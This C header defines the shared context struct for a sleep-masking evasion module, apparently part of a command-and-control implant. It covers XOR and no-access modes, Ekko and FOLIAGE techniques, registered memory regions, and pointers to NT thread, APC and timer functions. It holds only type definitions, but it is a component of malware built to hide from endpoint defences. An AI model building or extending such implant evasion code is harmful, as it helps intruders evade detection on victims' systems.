#pragma once
/*
 * evasion_pic_ctx.h — Shared PIC sleep mask context definition.
 *
 * Included by both evasion_pic.c (compiled -nostdlib, no windows.h) and
 * evasion.c (has windows.h).  Uses raw C types only so there is no
 * windows.h dependency.  The two compilation units MUST use this single
 * canonical definition to keep their struct layouts in sync.
 */

typedef unsigned int       pic_u32;
typedef unsigned long long pic_u64;
typedef long long          pic_i64;
typedef int                pic_i32;
typedef unsigned char      pic_u8;

#define PIC_MAX_REGIONS 8
#define PIC_XOR_KEY     0xA7u

typedef struct {
    void   *base;
    pic_u64 sz;
} PicRegion;

/*
 * SleepMaskCtx — all state for one sleep call.
 *
 * Lifecycle:
 *   evasion_init()   → allocates PIC, calls pic_fill_exports(&g_pic_ctx)
 *   sleep_masked(ms) → sets .mode/.ms/.conn_thread_count/.region* then calls
 *                       g_pic_sleep(&g_pic_ctx)
 */
typedef struct _SleepMaskCtx {
    /* ── current-sleep parameters ─────────────────────────────────────── */
    pic_u32   mode;              /* 0=none 1=xor 2=noaccess 3=ekko 4=foliage */
    pic_u32   ms;
    pic_i32   action;            /* reserved — pass 0 */

    /* ── registered regions ────────────────────────────────────────────── */
    pic_i32   region_count;
    PicRegion regions[PIC_MAX_REGIONS];
    volatile pic_i32 conn_thread_count;  /* snapshot before each sleep call */

    /* ── NT / kernel32 function pointers (filled by evasion_init) ──────── */
    pic_i64 (*NtDelay)(pic_i32 alertable, pic_i64 *interval);
    pic_i32 (*VProt)(void *addr, pic_u64 sz, pic_u32 newprot, pic_u32 *oldprot);
    pic_i64 (*NtCreateThreadEx)(void **hThread, pic_u64 access, void *objAttr,
                                 void *hProcess, void *startAddr, void *param,
                                 pic_u64 flags, pic_u64 stackZero,
                                 pic_u64 stackCommit, pic_u64 stackReserve,
                                 void *attrList);
    pic_i64 (*NtQueueApcThread)(void *hThread, void *apcRoutine,
                                 void *arg1, void *arg2, void *arg3);
    pic_i64 (*NtAlertResumeThread)(void *hThread, pic_u32 *suspendCount);
    pic_i64 (*NtTestAlert)(void);
    void *  (*CreateEventA)(void *sa, pic_i32 manualReset,
                             pic_i32 initialState, const char *name);
    pic_i32 (*SetEvent)(void *hEvent);
    pic_i32 (*CloseH)(void *h);          /* CloseHandle — renamed to avoid api_resolve.h macro */
    pic_u32 (*WaitForSingleObject)(void *h, pic_u32 ms);
    void *  (*CreateTimerQueue)(void);
    pic_i32 (*CreateTimerQueueTimer)(void **hTimer, void *hQueue,
                                      void *cb, void *param,
                                      pic_u32 dueTime, pic_u32 period,
                                      pic_u32 flags);
    pic_i32 (*DeleteTimerQueueEx)(void *hQueue, void *completionEvent);

    /* ── sync state (Ekko / FOLIAGE) ───────────────────────────────────── */
    volatile pic_i32 encrypted;
    void *event;                 /* HANDLE — valid only during sleep */

    /* ── callback addresses (filled by pic_fill_exports) ───────────────── */
    void *fn_sleep_mask_entry;   /* main dispatch fn — call g_pic_sleep via this */
    void *fn_ekko_encrypt;
    void *fn_ekko_decrypt;
    void *fn_foliage_encrypt;
    void *fn_foliage_sleep;
    void *fn_foliage_decrypt;
    void *fn_foliage_thread;
} SleepMaskCtx;
